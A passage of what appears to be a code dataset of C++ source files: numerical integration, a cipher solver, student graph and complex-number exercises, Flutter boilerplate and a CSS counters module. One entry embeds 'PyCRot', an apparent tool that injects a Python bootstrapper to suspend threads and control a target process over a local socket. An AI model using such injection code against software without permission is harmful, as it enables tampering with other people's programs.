integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson; \n                std::cout << std::setw(15) << n + 1;  \n            }\n        }\n        \n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n    }\n}\n\n// Simpson's method\nvoid simpsons(double a, double b, int iterations, double (*func)(double)) {\n    double prev_integral = 0.0; \n    double prev_prev_integral = 0.0; \n    \n    std::cout << \"Simpson's result:\" << std::endl;\n    std::cout   << std::setw(2)     << \"i\" \n                << std::setw(15)    << \"A(h_i)\" \n                << std::setw(20)    << \"A(h_(i-1))-A(h_i)\" \n                << std::setw(15)    << \"alp^k\" \n                << std::setw(15)    << \"Rich-error\" \n                << std::setw(15)    << \"f-calc\" \n                << std::endl;\n    \n    for (int i = 0; i <= iterations; i++) {\n        double n = pow(2, i);\n        double h = (b - a) / n;\n        double sum_even = 0.0;\n        double sum_odd = 0.0;\n        for (int j = 1; j < n; j++) {\n            double x = a + j * h;\n            if (j % 2 == 0) {\n                sum_even += func(x);\n            } else {\n                sum_odd += func(x);\n            }\n        }\n        double integral = (h / 3.0) * (func(a) + func(b) + 4.0 * sum_odd + 2.0 * sum_even);\n        std::cout << std::setw(2) << i+1 << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson; \n                std::cout << std::setw(15) << n + 1;  \n            }\n        }\n        \n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral ",
    "#include \"CaesarSub.h\"\r\n\r\n#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <cstdlib>\r\n#include <cctype>\r\n#include <cmath>\r\n#include <ctime>\r\n\r\nusing namespace std;\r\n\r\nbool CaesarSubSolve::seededRandGenerator = false;\r\n\r\nstatic string removeNonAlpha(const string& str) {\r\n\tstring ret = \"\";\r\n\tfor (unsigned long i = 0; i < str.length(); i++) {\r\n\t\tif (((str[i] >= 'a') && (str[i] <= 'z')) || ((str[i] >= 'A') && (str[i] <= 'Z'))) {\r\n\t\t\tret += tolower(str[i]);\r\n\t\t}\r\n\t}\r\n\treturn ret;\r\n}\r\n\r\nstatic string swap(const string& str, int i, int j) {\r\n\tstring ret(str);\r\n\tchar c = ret[j];\r\n\tret[j] = ret[i];\r\n\tret[i] = c;\r\n\treturn ret;\r\n}\r\n\r\nCaesarSubSolve::CaesarSubSolve(const string& corpusFile) : i1(0), i2(1) {\r\n\tif (!seededRandGenerator) {\r\n\t\tsrand(time(0));\r\n\t\tseededRandGenerator = true;\r\n\t}\r\n\r\n\tifstream in;\r\n\tin.open(corpusFile);\r\n\r\n\tif (in.fail()) {\r\n\t\tcout << \"Error opening corpus file: \" << corpusFile << endl;\r\n\t\tcout << \"Program will exit.\" << endl;\r\n\t\texit(-1);\r\n\t}\r\n\tcout << \"Processing The Corpus File...\" << endl;\r\n\tstring corpus = \"\", line;\r\n\twhile (in >> line) {\r\n\t\tcorpus += removeNonAlpha(line);\r\n\t}\r\n\tin.close();\r\n\tcout << \"Counting Quadgram Frequencies...\" << endl;\r\n\tstring currQuadgram;\r\n\tsize_t length = corpus.length() - 3;\r\n\tfor (long i = 0; i < length; i++) {\r\n\t\tcurrQuadgram = corpus.substr(i, 4);\r\n\t\tquadgramCounts[currQuadgram] += 1;\r\n\t}\r\n\tfor (auto iter = quadgramCounts.begin(); iter != quadgramCounts.end(); iter++) {\r\n\t\titer->second = log(iter->second / quadgramCounts.size());\r\n\t}\r\n}\r\n\r\nstring CaesarSubSolve::getRandomKey() {\r\n\tif (!seededRandGenerator) {\r\n\t\tsrand(time(0));\r\n\t\tseededRandGenerator = true;\r\n\t}\r\n\tstring key = \"\";\r\n\r\n\tvector<char> alphabet;\r\n\tfor (char c = 'a'; c <= 'z'; c++) {\r\n\t\talphabet.push_back(c);\r\n\t}\r\n\r\n\tint i;\r\n\twhile (!alphabet.empty()) {\r\n\t\ti = rand() % alphabet.size();\r\n\t\tkey += alphabet[i];\r\n\t\talphabet.erase(alphabet.begin() + i);\r\n\t}\r\n\treturn key;\r\n}\r\n\r\n/// <summary>\r\n/// Decocdes the given ciphertext given the key.\r\n/// </summary>\r\nstring CaesarSubSolve::decode(const string& ciphertext, const string& key) {\r\n\tstring decryption = \"\";\r\n\tfor (unsigned int i = 0; i < ciphertext.length(); i++) {\r\n\t\tif (((ciphertext[i] >= 'a') && (ciphertext[i] <= 'z')) || ((ciphertext[i] >= 'A') && (ciphertext[i] <= 'Z'))) {\r\n\t\t\tdecryption += key[tolower(ciphertext[i]) - 'a'];\r\n\t\t}\r\n\t}\r\n\treturn decryption;\r\n}\r\n\r\n/// <summary>\r\n/// Calculates the index of coincidence (IC) given some ciphertext.\r\n/// </summary>\r\ndouble CaesarSubSolve::calculateIC(const string& ciphertext) {\r\n\tstring text = removeNonAlpha(ciphertext);\r\n\tint counts[26];\r\n\tunsigned int i;\r\n\tdouble ic = 0;\r\n\r\n\tfor (i = 0; i < 26; i++) {\r\n\t\tcounts[i] = 0;\r\n\t}\r\n\r\n\tfor (i = 0; i < text.length(); i++) {\r\n\t\tcounts[(text[i] - 'a')]++;\r\n\t}\r\n\r\n\tfor (i = 0; i < 26; i++) {\r\n\t\tic += counts[i] * (counts[i] - 1);\r\n\t}\r\n\r\n\tic /= (text.length() * (text.length() - 1));\r\n\treturn ic;\r\n}\r\n\r\n/// <summary>\r\n/// Returns the fitness of the given text (higher values are better).\r\n/// </summary>\r\ndouble CaesarSubSolve::evaluateFitness(const string& text) const {\r\n\treturn evaluateFitness2(removeNonAlpha(text));\r\n}\r\n\r\ndouble CaesarSubSolve::evaluateFitness2(const string& text) const {\r\n\tdouble fitness = 0;\r\n\t// If the quadgram doesn't appear in the corpus at all, then it's unlikely that the text is English (assuming the corpus is a good sampling of English).\r\n\tdouble noQuadgram = (1.05 * log(1.0 / quadgramCounts.size()));\r\n\r\n\tstring currQuadgram;\r\n\tsize_t length = text.length() - 3;\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tcurrQuadgram = text.substr(i, 4);\r\n\t\tauto iter = quadgramCounts.find(currQuadgram);\r\n\t\tif (iter == quadgramCounts.end()) {\r\n\t\t\tfitness += noQuadgram;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tfitness += iter->second;\r\n\t\t}\r\n\t}\r\n\treturn fitness;\r\n}\r\n\r\nstring CaesarSubSolve::mutateKey(const string& key) {\r\n\tstring mutatedKey = swap(key, i1, i2);\r\n\r\n\tif (i2 < 25) {\r\n\t\ti2++;\r\n\t}\r\n\telse {\r\n\t\tif (i1 < 24) {\r\n\t\t\ti1++;\r\n\t\t}\r\n\t\telse {//reset\r\n\t\t\ti1 = 0;\r\n\t\t}\r\n\t\ti2 = (i1 + 1);\r\n\t}\r\n\treturn mutatedKey;\r\n}\r\n\r\n/*n = 26 -> sum(i, {i, 1, n - 1}) = ((n - 1)/2)(n) = 325*/\r\n#define MAX_SWAPS 325\r\n\r\n/// <summary>\r\n/// Decrypts the given ciphertext using a hill climbing algorithm.\r\n/// </summary>\r\nstring CaesarSubSolve::decrypt(const string& ciphertext) {\r\n\tstring bestKey = getRandomKey(), currKey;\r\n\tdouble bestFitness = evaluateFitness2(decode(ciphertext, bestKey)), currFitness;\r\n\tint numSwaps = 0;\r\n\r\n\twhile (numSwaps < MAX_SWAPS) {\r\n\t\tcurrKey = mutateKey(bestKey);\r\n\t\tcurrFitness = evaluateFitness2(decode(ciphertext, currKey));\r\n\t\tif (currFitness > bestFitness) {\r\n\t\t\tbestKey = currKey;\r\n\t\t\tbestFitness = currFitness;\r\n\t\t\tnumSwaps = 0;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tnumSwaps++;\r\n\t\t}\r\n\t}\r\n\r\n\treturn decode(ciphertext, bestKey);\r\n}\r\n",
    "/*There are flight paths between cities. If there is a flight between city A and city B then \nthere is an edge between the cities. The cost of the edge can be the time that flight takes \nto reach city B from A, or the amount of fuel used for the journey. Represent this as a graph. \nThe node can be represented by airport name or name of the city. Use adjacency list representation\nof the graph or use adjacency matrix representation of the graph. \t \n*/\n#include<iostream>\n#include<string.h>\nusing namespace std;\nclass flight\n{ \t \n\tpublic:\n\t\tint am[10][10];\n           \tchar city_index[10][10];\n\t\tflight();\n\t   \tint create();\n\t   \tvoid display(int city_count);\n            \n};\nflight::flight()\n{\n\tint i,j;\n\tfor(i=0;i<10;i++)\n\t{\n\t\tstrcpy(city_index[i],\"xx\");\n\t}\n\tfor(i=0;i<10;i++)\n\t{\n\t\tfor(j=0;j<10;j++)\n\t\t{\n\t\t\tam[i][j]=0;\n\t\t}\n\t}\n}\nint flight::create()\n{\n\tint city_count=0,j,si,di,wt;\n\tchar s[10],d[10],c;\n\tdo\n\t{\n\t\tcout<<\"\\n\\tEnter Source City      : \";\n\t\tcin>>s;\n\t\tcout<<\"\\n\\tEnter Destination City : \";\n\t\tcin>>d;\n\t\tfor(j=0;j<10;j++)\n\t\t{\n\t\t\t\tif(strcmp(city_index[j],s)==0)\n\t\t\t\t\tbreak;\n\t\t}\n\t\tif(j==10)\n\t\t{\n\t\t\tstrcpy(city_index[city_count],s);\n\t\t\t\tcity_count++;\n\t\t}\n\n\t\tfor(j=0;j<10;j++)\n\t\t{\n\t\t\t\tif(strcmp(city_index[j],d)==0)\n\t\t\t\t\tbreak;\n\t\t}\n\n\t\tif(j==10)\n\t\t{\n\t\t\tstrcpy(city_index[city_count],d);\n\t\t\t\tcity_count++;\n\t\t}\n\n\t\tcout<<\"\\n\\t Enter Distance From \"<<s<<\" And \"<<d<<\": \";\n\t\tcin>>wt;\n\t\tfor(j=0;j<10;j++)\n\t\t{\n\t\t\t\tif(strcmp(city_index[j],s)==0)\n\t\t\t\t\tsi=j;\n\t\t\t\tif(strcmp(city_index[j],d)==0)\n\t\t\t\t\tdi=j;\n\t\t}\n\t\tam[si][di]=wt;\n\t\tcout<<\"\\n\\t Do you want to add more cities.....(y/n) : \";\n\t\tcin>>c;\t\n\t}while(c=='y'||c=='Y');\n return(city_count);\n}\n\nvoid flight::display(int city_count)\n{\n\tint i,j;\n\tcout<<\"\\n\\t Displaying Adjacency Matrix :\\n\\t\";\n\tfor(i=0;i<city_count;i++)\n\t\tcout<<\"\\t\"<<city_index[i];\n\tcout<<\"\\n\";\n\n\tfor(i=0;i<city_count;i++)\n\t{\n\t\tcout<<\"\\t\"<<city_index[i];\n\t\tfor(j=0;j<city_count;j++)\n\t\t{\n\t\t  cout<<\"\\t\"<<am[i][j];\t\n\t\t}\n\t\tcout<<\"\\n\";\n\t}\n}\n\nint main()\n{\n\tflight f;\n\tint n,city_count;\n\tchar c;\n\tdo\n\t{\n\t\tcout<<\"\\n\\t***** Flight Main Menu *****\";\n\t\tcout<<\"\\n\\t1. Create \\n\\t2. Adjacency Matrix\\n\\t3. Exit\";\n\t\tcout<<\"\\n\\t.....Enter your choice : \";\n\t\tcin>>n;\n\t\tswitch(n)\n\t\t{\n\t\t\tcase 1:\n\t\t\t\t\tcity_count=f.create();\n\t\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\t\tf.display(city_count);\n\t\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\t\treturn 0;\n\t\t}\n\t\tcout<<\"\\n\\t Do you Want to Continue in Main Menu....(y/n) : \";\n\t\tcin>>c;\n\t}while(c=='y'||c=='Y');\n\treturn 0;\n}\n\n\n/*\n\t***** Flight Main Menu *****\n\t1. Create \n\t2. Adjacency Matrix\n\t3. Exit\n\t.....Enter your choice : 1\n\n\tEnter Source City      : A\n\n\tEnter Destination City : B\n\n\t Enter Distance From A And B: 10\n\n\t Do you want to add more cities.....(y/n) : Y\n\n\tEnter Source City      : A\n\n\tEnter Destination City : C\n\n\t Enter Distance From A And C: 20\n\n\t Do you want to add more cities.....(y/n) : Y\n\n\tEnter Source City      : C\n\n\tEnter Destination City : D\n\n\t Enter Distance From C And D: 40\n\n\t Do you want to add more cities.....(y/n) : Y\n\n\tEnter Source City      : D\n\n\tEnter Destination City : A\n\n\t Enter Distance From D And A: 30\n\n\t Do you want to add more cities.....(y/n) : Y\n\n\tEnter Source City      : D\n\n\tEnter Destination City : B\n\n\t Enter Distance From D And B: 50\n\n\t Do you want to add more cities.....(y/n) : N\n\n\t Do you Want to Continue in Main Menu....(y/n) : Y\n\n\t***** Flight Main Menu *****\n\t1. Create \n\t2. Adjacency Matrix\n\t3. Exit\n\t.....Enter your choice : 2\n\n\t Displaying Adjacency Matrix :\n\t\tA\tB\tC\tD\n\tA\t0\t10\t20\t0\n\tB\t0\t0\t0\t0\n\tC\t0\t0\t0\t40\n\tD\t30\t50\t0\t0\n\n\t Do you Want to Continue in Main Menu....(y/n) : \n*/\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"Builder.hpp\"\n\n// Product\nvoid Product::operator=(const Product& rhs) {\n    this->flavour = rhs.flavour;\n    this->layers = rhs.layers;\n}\n\n// CakeBaker\nvoid CakeBaker::reset() {\n    cake_ = Cake();\n}\n\nvoid CakeBaker::setLayers(const int& numberOfLayers) {\n    cake_.layers = numberOfLayers;\n}\n\nvoid CakeBaker::setFlavour(const std::string& flavour) {\n    cake_.flavour = flavour;\n}\n\n\n// RecipeBaker\nvoid RecipeBaker::reset() {\n    recipe_ = Recipe();\n}\nvoid RecipeBaker::setLayers(const int& numberOfLayers) {\n    recipe_.layers = numberOfLayers;\n}\n\nvoid RecipeBaker::setFlavour(const std::string& flavour) {\n    recipe_.flavour = flavour;\n}\n\n// Director\nstd::shared_ptr<Product> Director::makeChocolateCake(std::shared_ptr<Baker> baker) {\n    baker->reset();\n    baker->setFlavour(\"Chocolate\");\n    baker->setLayers(2);\n    \n    return baker->getProduct();\n}\n\nstd::shared_ptr<Product> Director::makeChocolateCakeRecipe(std::shared_ptr<Baker> baker) {\n    baker->reset();\n    baker->setFlavour(\"Chocolate\");\n    baker->setLayers(2);\n    \n    return baker->getProduct();\n}",
    "#include <WinSock2.h>\n#include <Windows.h>\n#include <tlhelp32.h>\n#include <algorithm>\n#include <iostream>\n#include <iomanip>\n#include <fstream>\n#include <tchar.h>\n#include <stdio.h>\n#include <psapi.h>\n#include <random>\n#include <string>\n#include <future>\n\n#pragma comment(lib, \"ws2_32.lib\")\n\nstd::string pyCRotBootstrapper = \"\\n\\tdef __init__(self,currentLocals):\\n\\t\\tdel currentLocals[self.__class__.__name__];self.locals=currentLocals;self.compile=__import__('codeop').CommandCompiler();self.importTable={'threading':__import__('threading'),'traceback':__import__('traceback'),'random':__import__('random'),'inspect':__import__('inspect'),'ctypes':__import__('ctypes'),'socket':__import__('socket'),'sys':__import__('sys'),'dis':__import__('dis'),'os':__import__('os')};self.currentThreadID=self.importTable['ctypes'].windll.kernel32.GetCurrentThreadId();self.interpreterBuffer=[];self.cApis={};self.breakpointTypes=['variable','value','constant','exception','line'];self.vtypeMapping={'var':'variable','val':'value','const':'constant','exc':'exception','ln':'line'};self.breakpoints=[];self.debuggerBuffer=[];self.debuggerEnabled=False;self.currentBreakpoint=None;self.localSelfName=''.join(self.importTable['random'].SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')for _ in range(16));self.locals[self.localSelfName]=self;self.cApis['OpenThread']=self.importTable['ctypes'].windll.kernel32.OpenThread;self.cApis['SuspendThread']=self.importTable['ctypes'].windll.kernel32.SuspendThread;self.cApis['ResumeThread']=self.importTable['ctypes'].windll.kernel32.ResumeThread;self.cApis['CreateToolhelp32Snapshot']=self.importTable['ctypes'].windll.kernel32.CreateToolhelp32Snapshot;self.cApis['Thread32First']=self.importTable['ctypes'].windll.kernel32.Thread32First;self.cApis['Thread32Next']=self.importTable['ctypes'].windll.kernel32.Thread32Next;self.cApis['CloseHandle']=self.importTable['ctypes'].windll.kernel32.CloseHandle;self.cApis['ThreadEntry32']=self.importTable['ctypes'].c_ulong*7;self.importTable['sys']._settraceallthreads(self.traceHook)\\n\\t\\tif self.shouldSuspendThreads:self.suspendAllThreads()\\n\\t\\tsock=self.importTable['socket'].socket(self.importTable['socket'].AF_INET,self.importTable['socket'].SOCK_STREAM);sock.connect(('127.0.0.1',self.serverPort));self.rfile=sock.makefile('r');self.wfile=sock.makefile('w');self.interact()\\n\\tdef help(self):self.log(\\\"Welcome to PyCRot's help utility! Here you can see all the functions in the hidden class and what they do!\\\");self.log('');self.log(self.localSelfName+'.log(argument)\\\\t\\\\t\\\\tThis function outputs whatever you pass into it in the PyCRot terminal');self.log(self.localSelfName+'.suspendAllThreads()\\\\t\\\\tSuspends all running threads (except for the pycrot one)');self.log(self.localSelfName+'.resumeAllThreads()\\\\t\\\\tResumes all running threads (except for the pycrot one)');self.log(self.localSelfName+'.addBreakpoint(type, value)\\\\tAdds a breakpoint to the table, also callable with addBP() or addbp()');self.log(self.localSelfName+'.deleteBreakpoint(type, value)\\\\tRemoved a breakpoint to the table, also callable with delBP() or delbp()');self.log(self.localSelfName+'.clearBreakpoints()\\\\t\\\\tClears the breakpoint table, also callable with clsBP() or clsbp()');self.log('');self.log('Breakpoint types:');self.log('\\\\tvariable/var\\\\t\\\\t\\\\t\\\\tBreakpoints when a variable with the specified name is found');self.log('\\\\tvalue/val\\\\t\\\\t\\\\t\\\\tBreakpoints when a variable with the specified value is found');self.log('\\\\tconstant/const\\\\t\\\\t\\\\t\\\\tBreakpoints when a constant with the specified value is found');self.log('\\\\texception/exc\\\\t\\\\t\\\\t\\\\tBreakpoints when a exception is triggered');self.log('\\\\tline/ln\\\\t\\\\t\\\\t\\\\t\\\\tBreakpoints when a number line gets executed')\\n\\tdef writeRaw(self,data):self.wfile.write(data);self.wfile.flush()\\n\\tdef suspendAllThreads(self):self.actionOnThreads('SuspendThread')\\n\\tdef resumeAllThreads(self):self.actionOnThreads('ResumeThread')\\n\\tdef traceHook(self,currentFrame,event,arg):\\n\\t\\tcurrentFBack=currentFrame\\n\\t\\twhile currentFBack.f_back!=None:\\n\\t\\t\\tcurrentFBack=currentFBack.f_back\\n\\t\\t\\tif currentFBack.f_locals.get('self')==self:return self.traceHook\\n\\t\\tcurrentFrame.f_trace_opcodes=True\\n\\t\\tfor vbreakpoint in self.breakpoints.copy():\\n\\t\\t\\tif vbreakpoint==True:self.triggerBreakpoint(currentFrame,vbreakpoint,'breakpoint on next execution')\\n\\t\\t\\telif vbreakpoint['type']=='variable':\\n\\t\\t\\t\\tif vbreakpoint['value']in currentFrame.f_locals.keys():self.triggerBreakpoint(currentFrame,vbreakpoint,str(vbreakpoint['value'])+' found in locals with value '+str(currentFrame.f_locals[vbreakpoint['value']]),arg)\\n\\t\\t\\telif vbreakpoint['type']=='value':\\n\\t\\t\\t\\tif vbreakpoint['value']in currentFrame.f_locals.values():self.triggerBreakpoint(currentFrame,vbreakpoint,str(vbreakpoint['value'])+' found in locals with key '+str(list(currentFrame.f_locals.keys())[list(currentFrame.f_locals.values()).index(vbreakpoint['value'])]),ar",
    "\ufeff#include <iostream>\n#include \"Lab4Exmaple.h\"\n#include \"ComplexVector.h\"\n#include \"ComplexMatrix.h\"\n#include \"MyAssoc.h\"\n\n\n\nint mainExample1() {\n\n\t/// <summary>\n\t/// \u0417\u0430\u0434\u0430\u043d\u043e : A,B,C,D,F  -  \u0412\u0435\u043a\u0442\u043e\u0440\u0438 \u043a\u043e\u043c\u043f\u043b\u0435\u0441\u043d\u0438\u0445 \u0447\u0438\u0441\u0435\u043b \n\t///         a,b,c - \u043a\u043e\u043c\u043f\u043b\u0435\u043a\u0441\u043d\u0456 \u0447\u0438\u0441\u043b\u0430.\n\t/// \u041e\u0431\u0447\u0438\u0441\u043b\u0438\u0442\u0438 \u0432\u0438\u0440\u0430\u0437 : F = A+B-B*c+C/b+D*a        \n\t/// </summary>\n\t/// <returns></returns>\n\tComplexDouble a(1.0, 2), b, c;\n#if defined(_MSC_VER)\n\tb._Val[_RE] = 2.3;\n\tb._Val[_IM] = 3.1;\n\tc = 4.1;\n#else \n\tb.real(2.3);\n\tb.imag(3.1);\n\tc.real(4.1);\n#endif\t\n\tComplexDouble r(2.7, 2.1);\n\tComplexVector A(3,r), B(3,a), C(3,b), D(3), F(1);\n\tD[0] = a; \n\tD[1] = b; \n\tD[2] = ComplexDouble(3.1, 1);\n\tF[0] = (1, 3);\n\tF[1] = 3.2;\n\tcout <<\" Begin data \"  << endl;\n\tcout << \" a= \" << a << \" b= \" << b << \" c \" << c << endl;\n\tcout << \" A  \\n\" << A;\n\tcout << \" B  \\n\" << B;\n\tcout << \" C  \\n\" << C;\n\tcout << \" D  \\n\" << D;\n\n\tF = A + B - B * c + C / b + D * a;\n\n\t\n\tcout << \" \\n F =   \\n\" << F;\n\tcout << \" A  \\n\" << A;\n\tcout << \"++ A  \\n\" << ++A;\n\tA++;\n\tcout << \" A ++ \\n\" << A;\n\treturn 2;\n}\n\n\n\n/// <summary>\n\t/// \u0417\u0430\u0434\u0430\u043d\u043e : A,B,C,D,F  -  \u041c\u0430\u0442\u0440\u0438\u0446\u0456 \u043a\u043e\u043c\u043f\u043b\u0435\u0441\u043d\u0438\u0445 \u0447\u0438\u0441\u0435\u043b\n\t///          a,b,c  -  \u0412\u0435\u043a\u0442\u043e\u0440\u0438 \u043a\u043e\u043c\u043f\u043b\u0435\u0441\u043d\u0438\u0445 \u0447\u0438\u0441\u0435\u043b \n\t///          _a,_b,_c - \u043a\u043e\u043c\u043f\u043b\u0435\u043a\u0441\u043d\u0456 \u0447\u0438\u0441\u043b\u0430.\n\t/// \u041e\u0431\u0447\u0438\u0441\u043b\u0438\u0442\u0438 \u0432\u0438\u0440\u0430\u0437 : F = A+B*_a-B*_c+C/_b; \n\t///                   c = F*a + D*b         \n\t/// </summary>\n\t/// <returns></returns>\n\nint mainExample2() {\n\tComplexMatrix A(5),  B(5), C(5), D(5), F(5);\n\tComplexVector a(5), b(5), c(5);\n\tComplexDouble _a(3.2, 5), _b(1, 2), _c = RandComplexDouble();\n\t\n\t\tA.RandComplexMatrix();\n\t\tB.RandComplexMatrix();\n\t\tC.RandComplexMatrix();\n\t\tD.RandComplexMatrix();\n\t\ta.RandComplexVector();\n\t\tb.RandComplexVector();\n\t\tc.RandComplexVector();\n\n\t\tcout << endl;\n\t\tcout << \"Matrix A \\n\" << A;\n\t\tcout << \"Matrix B \\n\" << B;\n\t\tcout << \"Matrix C \\n\" << C;\n\t\tcout << \"Matrix D \\n\" << D;\n\t\tcout << endl;\n\t\tcout << \"Vector a \\n\" << a;\n\t\tcout << \"Vector b \\n\" << b;\n\t\tcout << \"Vector c \\n\" << c;\n\t\n\t/// \u041e\u0431\u0447\u0438\u0441\u043b\u0438\u0442\u0438 \u0432\u0438\u0440\u0430\u0437 : F = A+B*_a-B*_c+C/_b; \n\t///                   c = F*a + D*b     \n\tF = A + B * _a - B * _c + C / _b;\n\tcout << \"Matrix F \\n\" << F;\n\tc = F * a + D * b;\n\tcout << \"Vector c \\n\" << c;\n\n\t\n\treturn 3;\n}\nint mainExample3() {\n\tcout << \" End begin \\n\";\n\tuint Flight[5] = { 12,32,23,43,43 };\n\tMyTime MTime[5] = { {9,10}, {10,30}, {10,30}, {10,30} , {15,35} };\n\tMyAssoc dbase(5, Flight, MTime);\n\tdbase.TableFlight();\n\tMyTime r = { 10,30 }, ro;\n\tuint fli = 32;\n\tro = dbase[fli];\n\tcout << \" Test : MyTime operator[](uint&s  )  \" << \"Flight \" << fli << \" time   \" <<\n\t\tro << endl;\n\tcout << \" Test : uint\toperator[](MyTime&s)  \" << \" time  \" << r << \" light  \" <<\n\t\tdbase[r] << endl;\n\tcout << \" Flight with time :   9   to  11 \\n\";\n\tdbase(9, 11);\n\tcout << \" End test \\n\";\n\treturn 4;\n}\n\n",
    "#include \"counters.h\"\n#include \"htmldocument.h\"\n#include \"box.h\"\n#include \"cssrule.h\"\n\nnamespace plutobook {\n\nCounters::Counters(Document* document)\n    : m_document(document)\n{\n}\n\nvoid Counters::push()\n{\n    m_scopes.push_back({});\n}\n\nvoid Counters::pop()\n{\n    for(auto name : m_scopes.back()) {\n        m_values[name].pop_back();\n    }\n\n    m_scopes.pop_back();\n}\n\nvoid Counters::reset(const GlobalString& name, int value)\n{\n    auto& scopes = m_scopes.back();\n    auto& values = m_values[name];\n    if(!scopes.contains(name)) {\n        scopes.insert(name);\n        values.push_back(value);\n    } else {\n        values.back() = value;\n    }\n}\n\nvoid Counters::increment(const GlobalString& name, int value)\n{\n    auto& scopes = m_scopes.back();\n    auto& values = m_values[name];\n    if(values.empty()) {\n        scopes.insert(name);\n        values.push_back(value);\n    } else {\n        values.back() += value;\n    }\n}\n\nvoid Counters::set(const GlobalString& name, int value)\n{\n    auto& scopes = m_scopes.back();\n    auto& values = m_values[name];\n    if(values.empty()) {\n        scopes.insert(name);\n        values.push_back(value);\n    } else {\n        values.back() = value;\n    }\n}\n\nvoid Counters::update(const Box* box)\n{\n    auto hasListItem = false;\n    static const GlobalString listItem(\"list-item\");\n    for(auto id : { CSSPropertyID::CounterReset, CSSPropertyID::CounterIncrement, CSSPropertyID::CounterSet }) {\n        auto value = box->style()->get(id);\n        if(value == nullptr || value->id() == CSSValueID::None)\n            continue;\n        for(auto& counter : to<CSSListValue>(*value)) {\n            auto& pair = to<CSSPairValue>(*counter);\n            auto& name = to<CSSCustomIdentValue>(*pair.first());\n            auto& value = to<CSSIntegerValue>(*pair.second());\n            hasListItem |= listItem == name.value();\n            switch(id) {\n            case CSSPropertyID::CounterReset:\n                reset(name.value(), value.value());\n                break;\n            case CSSPropertyID::CounterIncrement:\n                increment(name.value(), value.value());\n                break;\n            case CSSPropertyID::CounterSet:\n                set(name.value(), value.value());\n                break;\n            default:\n                assert(false);\n            }\n        }\n    }\n\n    if(hasListItem)\n        return;\n    auto element = to<HTMLElement>(box->node());\n    if(box->isListItemBox()) {\n        if(element && element->tagName() == liTag) {\n            auto liElement = static_cast<HTMLLIElement*>(element);\n            if(auto value = liElement->value()) {\n                reset(listItem, *value);\n                return;\n            }\n        }\n\n        increment(listItem, 1);\n        return;\n    }\n\n    if(element == nullptr)\n        return;\n    if(element->tagName() == olTag) {\n        auto olElement = static_cast<HTMLOLElement*>(element);\n        reset(listItem, olElement->start() - 1);\n        return;\n    }\n\n    if(element->tagName() == ulTag\n        || element->tagName() == dirTag\n        || element->tagName() == menuTag) {\n        reset(listItem, 0);\n    }\n}\n\nHeapString Counters::counterText(const GlobalString& name, const GlobalString& listStyle, const HeapString& separator) const\n{\n    auto heap = m_document->heap();\n    auto it = m_values.find(name);\n    if(it == m_values.end())\n        return heap->createString(m_document->getCounterText(0, listStyle));\n    if(separator.empty()) {\n        int value = 0;\n        if(!it->second.empty())\n            value = it->second.back();\n        return heap->createString(m_document->getCounterText(value, listStyle));\n    }\n\n    std::string text;\n    for(auto value : it->second) {\n        if(!text.empty())\n            text += separator.value();\n        text += m_document->getCounterText(value, listStyle);\n    }\n\n    return heap->createString(text);\n}\n\nHeapString Counters::markerText(const GlobalString& listStyle) const\n{\n    static const GlobalString name(\"list-item\");\n    auto heap = m_document->heap();\n    auto it = m_values.find(name);\n    if(it == m_values.end())\n        return heap->createString(m_document->getMarkerText(0, listStyle));\n    int value = 0;\n    if(!it->second.empty())\n        value = it->second.back();\n    return heap->createString(m_document->getMarkerText(value, listStyle));\n}\n\n} // namespace plutobook\n",
